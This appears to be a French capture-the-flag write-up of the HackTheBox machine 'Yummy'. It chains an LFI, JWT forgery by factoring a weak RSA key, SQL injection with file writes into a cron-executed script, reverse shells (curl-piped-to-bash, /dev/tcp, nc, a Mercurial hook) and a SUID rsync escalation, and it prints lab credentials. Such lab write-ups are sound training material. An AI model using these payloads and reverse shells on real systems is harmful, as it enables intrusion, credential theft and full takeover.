---
date: 2025-02-22T02:00:16-06:00
# description: ""
image: "/images/HTB-Yummy/Yummy.png"
showTableOfContents: true
tags: ["HackTheBox"]
categories: ["Writeups"]
title: "HTB: Yummy"
type: "post"
---

* Platforme: HackTheBox
* Lien: [Yummy](https://app.hackthebox.com/machines/Yummy)
* Niveau: Difficile
* OS: Linux
---

Yummy présente une surface d'attaque relativement réduite. Une vulnérabilité de type Local File Inclusion (LFI) permet d'accéder au code source de l'application. L'examen du code révèle une faible sécurité des clés RSA pour l'authentification JWT, permettant la création de jetons avec des privilèges plus élevés.

Une énumération plus poussée du tableau de bord de l'administrateur conduit à la découverte d'une vulnérabilité d'injection SQL dans la fonction de recherche. Combinée au privilège `FILE`, cette vulnérabilité nous permet d'écrire du contenu dans des fichiers sur le système, ce qui conduit à l'exécution de code à distance (RCE).

L'escalade des privilèges est réalisée à travers plusieurs pivots: l'exploitation d'un cron job, l'extraction des informations d'identification dans un fichier binaire, et l'exploitation de Mercurial (`hg pull`) via des hooks. Enfin, l'accès root est obtenu en abusant des privilèges sudo sur `rsync`, permettant une synchronisation de fichiers sans restriction avec des privilèges élevés.

## Balayage

```
nmap -sC -sV -oA nmap/Yummy {TARGET_IP}
```

**Résultats**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 11:42 CST
Nmap scan report for 10.129.140.209
Host is up (0.053s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION

22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a2:ed:65:77:e9:c4:2f:13:49:19:b0:b8:09:eb:56:36 (ECDSA)
|_  256 bc:df:25:35:5c:97:24:f2:69:b4:ce:60:17:50:3c:f0 (ED25519)

80/tcp open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://yummy.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.58 seconds
```

Nous découvrons deux ports ouverts:
* 22 - SSH 
* 80 - http

Il y a aussi une redirection vers `yummy.htb`.

```
sudo echo "{TARGET_IP} yummy.htb" | sudo tee -a /etc/hosts
```

## Enumération

À `http://yummy.htb/`, nous trouvons le site web d'un restaurant.

![Yummy website](/images/HTB-Yummy/yummy_website.png)

Nous pouvons créer un compte à l'adresse `http://yummy.htb/register` et nous connecter à `http://yummy.htb/login`. Un compte est nécessaire pour accéder à `http://yummy.htb/dashboard`.

Après avoir créé et connecté notre compte, nous faisons une réservation à `http://yummy.htb/#book-a-table` en utilisant le bouton `BOOK A TABLE`.

> La réservation doit être faite avec l'email du compte créé, sinon elle n'apparaîtra pas sur le tableau de bord.

![Table reservation](/images/HTB-Yummy/reserve_table.png)

Sur le tableau de bord de notre compte, nous voyons la réservation, nous pouvons l'annuler ou l'enregistrer dans un calendrier.

![Yummy dashboard](/images/HTB-Yummy/yummy_dashboard.png)

En essayant l'option `SAVE iCALENDAR`, nous obtenons un fichier `.ics`. Il s'agit d'un fichier texte utilisé pour stocker et partager des données de calendrier. Ils suivent la norme iCalendar ([RFC 5545](https://datatracker.ietf.org/doc/html/rfc5545)).

![iCalendar file](/images/HTB-Yummy/ics_file.png)

Cette fonction ne semble pas exploitable.

### Vulnérabilité LFI

Nous utilisons à nouveau la même option mais interceptons la requête cette fois-ci. Après avoir transmis la première requête (`/reminder`), nous obtenons une deuxième requête GET vers `/export`.

> Il est nécessaire de répéter le processus de réservation plusieurs fois afin de continuellement exploiter la vulnérabilité LFI.

![export request](/images/HTB-Yummy/export_request.png)

Nous découvrons une vulnérabilité LFI en utilisant le payload `/export/../../../../etc/passwd`.

![LFI vulnerability in /export](/images/HTB-Yummy/LFI_in_export.png)

Nous trouvons deux utilisateurs : `dev` et `qa`.

![Target users accounts](/images/HTB-Yummy/target_users.png)

Nous essayons de progresser dans notre énumération en vérifiant des fichiers tels que `/proc/self/environ` ou `proc/x/cmdline`. Mais ils donnent tous les deux une erreur `500 Internal Server Error`.

![proc environ test](/images/HTB-Yummy/proc_environ.png)

![proc cmdline test](/images/HTB-Yummy/proc_cmdline.png)

Nous continuons avec le fichier `/etc/crontab`.

![/etc/crontab file](/images/HTB-Yummy/etc_crontab_LFI.png)

#### Cron jobs découverts

Nous trouvons trois cron jobs différents sur la cible.

![custom cron jobs](/images/HTB-Yummy/etc_crontab.png)

```
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
*/15 * * * * mysql /bin/bash /data/scripts/table_cleanup.sh
* * * * * mysql /bin/bash /data/scripts/dbmonitor.sh
```

Examinons le contenu de ces scripts.

**app_backup.sh**
```
/export/../../../../data/scripts/app_backup.sh
```

![app_backup cron job](/images/HTB-Yummy/app_backup.sh.png)

```bash
#!/bin/bash

cd /var/www
/usr/bin/rm backupapp.zip
/usr/bin/zip -r backupapp.zip /opt/app
```

Ce script supprime tout fichier `backupapp.zip` existant dans `/var/www` et crée ensuite une nouvelle sauvegarde du répertoire `/opt/app` au même endroit.

**table_cleaneup.sh**
```
/export/../../../../data/scripts/table_cleanup.sh
```

![table cleanup cron job](/images/HTB-Yummy/table_cleanup.png)

> Nous récupérons les identifiants mysql `chef:3wDo7gSRZIwIHRxZ!`.

```bash
#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
```

Ce script se connecte à la base de données MySQL `yummy_db` en utilisant l'utilisateur `chef` et exécute les commandes SQL trouvées dans `/data/scripts/sqlappointments.sql`.

**sqlappointments.sql**

Nous pouvons également vérifier les commandes SQL avec le payload `/export/../../../../../data/scripts/sqlappointments.sql`.

![sql_appointments queries](/images/HTB-Yummy/sqlappointments.png)

```SQL
TRUNCATE table users;
TRUNCATE table appointments;
INSERT INTO appointments (appointment_email, appointment_name, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES ("chrisjohnson@email.net", "Chris Johnson", "2024-05-25", "11:45", "2", "No allergies, prefer table by the window", "customer");

<SNIP> 

INSERT INTO appointments (appointment_email, appointment_name, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES ("michaelsmith@domain.edu", "Michael Smith", "2024-11-05", "20:45", "2", "Need a socket for laptop charging", "customer");
```

La commande `truncate` vide les tables `users` et `appointments`. Des données sont aussi insérées dans la table `appointments` avec des détails de réservation tels que `appointment_email`, `appointment_name`, `appointment_date`, etc.

**dbmonitor.sh**
```
/export/../../../../data/scripts/dbmonitor.sh
```

![dbmonitor LFI request](/images/HTB-Yummy/dbmonitor.png)

![dbmonitor script content](/images/HTB-Yummy/dbmonitor2.png)

```bash
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

Ce script surveille le service MySQL et effectue des actions de restauration s'il est interrompu:

* Enregistre les temps d'arrêt dans `/data/scripts/dbstatus.json`.
* Envoie des notifications par email lorsque MySQL est hors service ou se rétablit.
* Exécute un script de restauration (`fixer-v*`) si MySQL s'arrête.
* Supprime `dbstatus.json` lorsque MySQL est de nouveau en ligne.


**Download backupapp.zip**

Nous interceptons la demande obtenue après avoir utilisé la fonction `SAVE iCALENDAR`, transmettons la première requête (`/reminder`), modifions le payload de la deuxième requête (`/export`) par l'emplacement du fichier `backupapp.zip` et nous la transmettons pour télécharger le fichier. 

```
export/../../../../var/www/backupapp.zip
```

![backupapp file download](/images/HTB-Yummy/backupapp_download3.png)

Après avoir extrait `backupapp.zip`, nous obtenons un répertoire `opt`.

![source code files](/images/HTB-Yummy/source_code_files.png)

### Revue du code

Nous pouvons utiliser `vscode` pour faciliter l'analyse du code. Dans `app/app.py` nous trouvons les mêmes credentials (`chef`:`3wDo7gSRZIwIHRxZ!`) et la même base de données (`yummy_db`) découverts dans le script `table_cleanup.sh`. 

![creds found in app.py](/images/HTB-Yummy/db_creds_yummy.png)

Nous trouvons également toutes les différentes routes présentes dans l'application telles que `/export`, `/book`, etc. `/dashboard` est également présent mais nous remarquons qu'il y a une redirection vers une nouvelle route `/admindashboard` si l'utilisateur authentifié est `administrator`.

![Redirection code](/images/HTB-Yummy/redirection_yummy.png)

Le code de la route `/admindashboard` mentionnée est disponible plus bas.

![admindashboard route code](/images/HTB-Yummy/admindashboard_code.png)

Nous devons donc trouver comment l'application détermine si un utilisateur est `administrator`.

Elle le fait via la fonction `validate_login()` dans `app.py`. Elle vérifie le token de l'utilisateur et son rôle. Dans cette fonction, la fonction `verify_token()` est invoquée.

![validate_login function](/images/HTB-Yummy/validate_login.png)

Le rôle de la fonction `verify_token()` dans `app/middleware/verification.py` est d'authentifier et de valider le JWT (JSON Web Token). Après avoir fixé la valeur de `token` à `none`, elle recherche l'en-tête `Cookie` dans les requêtes et lorsqu'elle la trouve, la fonction extrait la valeur du jeton. Elle recherche spécifiquement la clé `X-AUTH-Token` à l'intérieur du cookie et récupère la valeur du jeton associé. Un code de statut `401` sera retourné avec le message `Authentication Token is missing` si aucun jeton n'est fourni ou si la valeur du jeton ne peut pas être récupérée.

Lorsqu'un token est extrait avec succès, il est décodé avec la méthode `jwt.decode`, qui utilise la clé publique du module `signature` (ce module contient un script python appelé `signature.py`) avec l'algorithme `RS256` spécifié. Les données décodées doivent contenir le rôle de l'utilisateur (`customer` ou `administrator`) et un email.

![verify.py file](/images/HTB-Yummy/verification_yummy.png)

Le fichier `signature.py` dans `app/config/` est un script utilisé pour générer une paire de clés RSA.  Il utilise deux nombres premiers aléatoires `q` et `n`. 

La sécurité RSA dépend du choix de nombres premiers aléatoires de grande taille pour `p` et `q`, de sorte que la factorisation de `n = p * q` soit infaisable. Ici, `q` est un nombre premier plus petit (~20 bits) ce qui facilite les attaques par force brute.  Lorsque nous trouvons `q`, `p` peut être déduit puisque `p = n // q`, ce qui nous permet de calculer la clé privée. A partir de là, nous pouvons signer nos propres jetons JWT et nous octroyer le rôle `administrator` pour l'escalade des privilèges.

![signature.py file](/images/HTB-Yummy/signature_yummy.png)

Nous allons utiliser un script python pour obtenir un jeton JWT en tant que `administrator`.

```python
from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy
import jwt
import base64

original_jwt = "PUT YOUR CURRENT JWT TOKEN HERE"
s = original_jwt.split(".")[1].encode()
s = base64.b64decode(s + b'=' * (-len(s) % 4)).decode()
n = int(s.split('"n":')[1].split('"')[1])

e = 65537

factors = sympy.factorint(n)  # Returns a dictionary of prime factors
p, q = list(factors.keys())

phi_n = (p - 1) * (q - 1)

d = pow(e, -1, phi_n)


key = RSA.construct((n, e, d, p, q))
signing_key = key.export_key()

decoded_payload = jwt.decode(original_jwt, signing_key, algorithms=["RS256"], options={"verify_signature": False})

decoded_payload['role'] = 'administrator'

new_jwt = jwt.encode(decoded_payload, signing_key, algorithm='RS256')

print(new_jwt)
```

Après avoir remplacé notre `X-AUTH-Token` par celui fourni par le script et rafraîchi la page, nous accédons à `http://yummy.htb/admindashboard`.

La seule nouveauté est que nous avons maintenant une fonction de recherche. 

![admindashboard accessed](/images/HTB-Yummy/admin_dashboard.png)

### Vulnérabilité injection SQL

Elle utilise le paramètre `o`.

![search feature request](/images/HTB-Yummy/search_feature.png)

Testons-le pour l'injection SQL avec SQLmap.

![SQLi test](/images/HTB-Yummy/SQLi_test.png)

```
sqlmap -r req.txt --batch
```

SQLmap identifie avec succès certains points d'injection.

![SQL injections points](/images/HTB-Yummy/sqli_points.png)

Nous connaissons déjà le nom de la base de données, alors extrayons son contenu.

```
sqlmap -r req.txt --level=5 --risk=3 -D yummy_db --dump --batch
```

Deux tables sont trouvées `appointments` et `users` mais elles ne contiennent rien d'utile.

![appointments table](/images/HTB-Yummy/appointments_tb.png)

![users table](/images/HTB-Yummy/users_tb.png)

Nous vérifions également les privilèges de l'utilisateur actuel.

```
sqlmap -r req.txt --level=5 --risk=3 -D yummy_db --batch --privileges
```

![database user privilege](/images/HTB-Yummy/db_privs.png)

Sous MySQL, le privilège `FILE` donne à un utilisateur les permissions de lecture et d'écriture sur le système de fichiers du serveur. Dans notre cas, cela signifie que l'utilisateur `chef` peut :

1. Lire des fichiers: Transférer des données depuis des fichiers sur le serveur dans les tables de la base de données en utilisant `LOAD DATA INFILE`.
2. Écrire des fichiers: Sauvegarder les résultats des requêtes dans des fichiers en utilisant `SELECT ... INTO OUTFILE`.
3. Modifier des fichiers: Écrire potentiellement un contenu arbitraire dans les fichiers, en fonction des permissions du répertoire.

Nous nous rappelons que `dbmonitor.sh` est exécuté en tant qu'utilisateur `mysql` toutes les minutes. Dans le script, il y a une condition pour exécuter le plus récent script avec `/data/scripts/fixer-v*` si `dbstatus.json` existe et ne mentionne pas que mysql est down (spécifiquement la chaîne de caractères `database is down`). 

```bash
else
    /usr/bin/rm -f /data/scripts/dbstatus.json
    /usr/bin/echo "The automation failed in some way, attempting to fix it."
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
```

## Accès Initial (Shell en tant que mysql)

Nous pouvons donc insérer une chaîne dans `dbstatus.json` pour nous assurer que le fichier existe et déclenche l'exécution du script dans `/data/scripts`.

1. Nous injectons une chaîne dans `/data/scripts/dbstatus.json` avec `SELECT "hacked" INTO OUTFILE '/data/scripts/dbstatus.json';`. Le payload complet est le suivant:

```
/admindashboard?s=aa&o=ASC%3b+select+"hacked;"+INTO+OUTFILE++'/data/scripts/dbstatus.json'+%3b
```

![payload to insert content](/images/HTB-Yummy/insert_content.png)

2. Ensuite, nous insérons une commande dans le script fixateur pour obtenir un reverse shell avec `curl IP:PORT/shell.sh | bash;`

> Nous aurons besoin de configurer un serveur web, la commande téléchargera notre script malveillant et l'exécutera sur la cible.

```
/admindashboard?s=aa&o=ASC%3b+select+"curl+{IP}:{PORT}/shell.sh+|bash%3b"+INTO+OUTFILE++'/data/scripts/fixer-v___'+%3b 
```

**FICHIER REVERSE SHELL**
```bash
#!/bin/bash
 
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f
```

![command injection](/images/HTB-Yummy/cmd_injection_yummy.png)

Sur notre listener, nous recevons une connexion en tant que `mysql`.

![Shell as myql](/images/HTB-Yummy/foothold.png)

### Shell en tant que www-data

Nous savons qu'il y a un autre job cron qui exécute `/data/scripts/app_backup.sh` en tant que `www-data` toutes les minutes. Nous pouvons donc remplacer `app_backup.sh` par un fichier reverse shell pour passer à cet utilisateur.

```
*/1 * * * * www-data /bin/bash /data/scripts/app_backup.sh
```

```
mv app_backup.sh app_backup.sh.one

echo 'bash -i >& /dev/tcp/{IP}/{PORT} 0>&1' > revshell.sh

mv revshell.sh app_backup.sh
```

![www-data privilege escaltion](/images/HTB-Yummy/privesc_wdata.png)

Après environ une minute, nous avons un shell sous le nom de `www-data`.

![www-data shell](/images/HTB-Yummy/shell_wdata.png)

### Shell en tant que qa

Dans `/var/www/app-qatesting` nous trouvons un répertoire caché `.hg`.

![hg directory](/images/HTB-Yummy/hg_dir.png)

Cherchons des mots de passe avec `grep`.

```
grep -rni "password" .
```

![grep command](/images/HTB-Yummy/grep_match.png)

`grep` identifie une correspondance dans un fichier binaire, par défaut il n'affiche pas son contenu. Nous pouvons y remédier avec l'option `-- text`.

```
grep -arni --text "password" .
```

![passwords found](/images/HTB-Yummy/pwds_found.png)

Deux mots de passe sont trouvés, le premier est le mot de passe de l'utilisateur `chef`. Comme nous avons affaire à un fichier binaire, nous utilisons `strings` pour afficher les résultats.

```
strings ./store/data/app.py.i | grep -A 10 -B 5 "password"
```

Nous découvrons le mot de passe de l'utilisateur `qa`.

```
qa:jPAd!XQCtn8Oc@2B
```

![user qa credentials](/images/HTB-Yummy/qa_creds.png)

Nous nous connectons avec succès en tant que `qa` avec ces informations d'identification via SSH.

![user flag](/images/HTB-Yummy/user_text.png)

### Shell en tant que dev

L'utilisateur actuel `qa` est capable d'exécuter `/usr/bin/hg pull /home/dev/app-production/` en tant qu'utilisateur `dev`.

![qa sudo privileges](/images/HTB-Yummy/sudo_privs.png)

La commande `hg` est utilisée pour l'outil de gestion de contrôle de version Mercurial. La commande `hg pull` est utilisée pour mettre à jour un dépôt en y intégrant les modifications d'un autre. Nous pouvons donc créer un répertoire `.hg` malveillant (c'est dans ce répertoire que les dépôts Mercurial stockent leurs paramètres, comme `.git` pour Git). Nous injecterons ensuite un hook malveillant afin d'exécuter notre commande reverse shell.

1. Nous configurons notre dépôt malveillant

```
cd /tmp
mkdir .hg
chmod 777 .hg
cp ~/.hgrc .hg/hgrc  
```

> Le fichier `hgrc` est le fichier de configuration de Mercurial, il contient des paramètres tels que les chemins de dépôt et les hooks.

![Mercurial file creation](/images/HTB-Yummy/hg_files_creation.png)

2. Nous ajoutons notre hook malveillant dans `/tmp/.hg/hgrc`

> Les hooks sont utilisés pour exécuter des commandes lors d'événements spécifiques (dans notre exemple, `post-pull` s'exécutera après le téléchargement des modifications).

```
[hooks]  
post-pull = /tmp/revshell.sh  
```

![Mercurial hooks](/images/HTB-Yummy/hg_hooks.png)

3. Ensuite, nous créons notre fichier `revshell.sh` dans le dossier `/tmp`.

```bash
#!/bin/bash  
/bin/bash -i >/dev/tcp/{IP}/{PORT} 0<&1 2>&1
```

4. Enfin, nous rendons le fichier reverse shell exécutable et exécutons la commande `hg`.

```
chmod +x /tmp/revshell.sh

sudo -u dev /usr/bin/hg pull /home/dev/app-production/
```

> N'oubliez pas de démarrer le listener.

![hg command execution](/images/HTB-Yummy/hg_cmd_exec.png)

Sur notre listener, nous obtenons un shell en tant que `dev` et nous découvrons que cet utilisateur peut exécuter `rsync` en tant que root pour synchroniser les fichiers de `/home/dev/app-production` avec `/opt/app` sans fournir de mot de passe.

## Escalade de privilèges (Shell en tant que root)

![shell as dev](/images/HTB-Yummy/dev_shell.png)

Nous pouvons copier un binaire, lui ajouter le bit SUID et changer son propriétaire en `root` afin d'escalader nos privilèges et d'obtenir un shell root.

```
cd /home/dev/ 

cp /bin/bash app-production/bash  

chmod u+s app-production/bash  

sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/  

/opt/app/bash -p  
```

![root flag](/images/HTB-Yummy/root_flag.png)

## Ressources additionnelles

J'espère que cet article vous a été utile et je vous remercie d'avoir pris le temps de le lire !

Voici quelques ressources pour en apprendre davantage sur les concepts de cette box:
* [Public Key Cryptography Basics](https://tryhackme.com/room/publickeycrypto) sur TryHackme.
* [Breaking RSA](https://tryhackme.com/room/breakrsa) sur TryHackme.
* [JWT Security](https://tryhackme.com/room/jwtsecurity) sur TryHackme.
* [JWT Attacks](https://portswigger.net/web-security/jwt) sur PortSwigger Academy.
* [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33) et [SQLMap Essentials](https://academy.hackthebox.com/module/details/58) sur HackTheBox Academy.
